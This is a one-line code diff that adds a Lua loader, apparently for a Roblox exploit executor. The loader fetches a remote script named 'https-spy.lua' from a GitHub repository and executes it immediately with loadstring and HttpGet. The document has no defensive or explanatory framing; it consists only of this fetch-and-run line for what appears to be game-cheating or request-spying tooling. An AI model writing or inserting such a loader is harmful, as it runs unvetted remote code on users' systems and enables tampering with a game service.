@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Patskorn/Teleport/main/https-spy.lua"))()
